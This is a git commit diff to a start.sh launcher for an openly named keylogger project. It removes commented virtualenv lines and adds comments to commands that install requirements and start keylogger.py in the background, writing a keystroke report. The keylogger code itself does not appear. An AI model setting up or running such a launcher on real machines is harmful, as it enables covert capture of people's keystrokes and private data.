ed93d7590938be84273fded00a452440f2989666
Ir0n-M4rsh4l <93084559+Ir0n-M4rsh4l@users.noreply.github.com>
2021-10-24 16:55:48 +0200

    Update start.sh

--- start.sh
+++ start.sh
@@ -2,9 +2,6 @@
 sleep 1
 PATH=/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
 export DISPLAY=:0.0
-#/usr/bin/python3 -m venv /home/hacker/Bureau/keylogger/venvp
-#cd /home/hacker/Bureau/keylogger/venvp
-#source /bin/activate
 
-pip3 install -r  /home/hacker/Bureau/keylogger/requirements.txt
-(python3 /home/hacker/Bureau/keylogger/keylogger.py /home/hacker/Bureau/keylogger/)&
+pip3 install -r  /home/hacker/Bureau/keylogger/requirements.txt #change the path to your directory
+(python3 /home/hacker/Bureau/keylogger/keylogger.py /home/hacker/Bureau/keylogger/)& # the first directory is the location of the keylogger.py, the second is where you will find the kelogger report
